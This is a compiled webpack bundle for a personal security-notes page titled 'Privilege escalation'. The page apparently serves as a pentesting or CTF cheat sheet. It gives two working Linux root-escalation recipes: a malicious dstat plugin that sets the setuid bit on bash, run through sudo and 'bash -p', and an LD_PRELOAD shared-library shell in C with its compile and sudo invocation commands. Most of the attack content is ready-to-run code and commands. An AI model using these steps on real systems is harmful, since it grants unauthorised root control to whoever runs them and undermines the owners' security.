"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[6201],{88817:(e,s,t)=>{t.r(s),t.d(s,{assets:()=>o,contentTitle:()=>c,default:()=>h,frontMatter:()=>r,metadata:()=>a,toc:()=>l});var n=t(74848),i=t(28453);const r={},c="\ud83d\udd12 Privilege escalation",a={id:"security/privilege-escalation/index",title:"\ud83d\udd12 Privilege escalation",description:"dstat",source:"@site/docs/security/03-privilege-escalation/index.md",sourceDirName:"security/03-privilege-escalation",slug:"/security/privilege-escalation/",permalink:"/docs/security/privilege-escalation/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/03-privilege-escalation/index.md",tags:[],version:"current",frontMatter:{},sidebar:"securitySidebar",previous:{title:"Telnet (23)",permalink:"/docs/security/network/protocols/telnet"},next:{title:"\ud83d\udcbb Binary",permalink:"/docs/security/binary/"}},o={},l=[{value:"dstat",id:"dstat",level:3},{value:"LD_PRELOAD trick",id:"ld_preload-trick",level:3}];function d(e){const s={code:"code",h1:"h1",h3:"h3",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(s.h1,{id:"-privilege-escalation",children:"\ud83d\udd12 Privilege escalation"}),"\n",(0,n.jsx)(s.h3,{id:"dstat",children:"dstat"}),"\n",(0,n.jsx)(s.p,{children:"If dstat can be run as root it is possible to write a new plugin to make some actions like the root inside the system."}),"\n",(0,n.jsx)(s.p,{children:"Using LinPeas the output should be something like this:"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{children:"permit nopass <user> as root cmd /usr/bin/dstat\n"})}),"\n",(0,n.jsx)("p",{align:"center",children:(0,n.jsx)("img",{width:"70%",src:t(23292).A})}),"\n",(0,n.jsxs)(s.p,{children:["New plugins can be written inside the folder ",(0,n.jsx)(s.code,{children:"/usr/local/share/dstat"})]}),"\n",(0,n.jsxs)(s.p,{children:["The filename format should be ",(0,n.jsx)(s.code,{children:"dstat_<plugin_name>.py"})," like ",(0,n.jsx)(s.code,{children:"dstat_hack.py"})]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"vi /usr/local/share/dstat/dstat_hack.py\n"})}),"\n",(0,n.jsx)(s.p,{children:"This could be the content of the file"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-py",children:"import os\nos.system('chmod +s /usr/bin/bash')\n"})}),"\n",(0,n.jsx)(s.p,{children:"This code once executed activates the setuid bit of bash making it runnable as root."}),"\n",(0,n.jsx)(s.p,{children:"Now, it is possible to run the custom plugin and become root."}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{children:"sudo /usr/bin/dstat --hack\nbash -p\n"})}),"\n",(0,n.jsx)(s.h3,{id:"ld_preload-trick",children:"LD_PRELOAD trick"}),"\n",(0,n.jsx)(s.p,{children:"You can use this trick if the user has access to a binary or a script with sudo privilege."}),"\n",(0,n.jsxs)(s.p,{children:["Also, there must be no specific override of the LD_PRELOAD variable. You can check it by using the command ",(0,n.jsx)(s.code,{children:"sudo -l"}),"."]}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-c",metastring:'title="shell.c"',children:'void _init()\n{\n    unsetenv("LD_PRELOAD");\n    setgid(0);\n    execl("/bin/sh", "-sh", 0);\n}\n'})}),"\n",(0,n.jsx)(s.p,{children:"To compile use this command:"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"gcc -shared -fPIC -nostartfiles -o shell.so shell.c\n"})}),"\n",(0,n.jsx)(s.p,{children:"Finally, run the file with privileges prepended with the new library"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-bash",children:"sudo LD_PRELOAD=/tmp/shell.so <PATH>\n"})})]})}function h(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,n.jsx)(s,{...e,children:(0,n.jsx)(d,{...e})}):d(e)}},23292:(e,s,t)=>{t.d(s,{A:()=>n});const n=t.p+"assets/images/dstat-2a502064d3b707ea7936862160911f7a.png"},28453:(e,s,t)=>{t.d(s,{R:()=>c,x:()=>a});var n=t(96540);const i={},r=n.createContext(i);function c(e){const s=n.useContext(r);return n.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),n.createElement(r.Provider,{value:s},e.children)}}}]);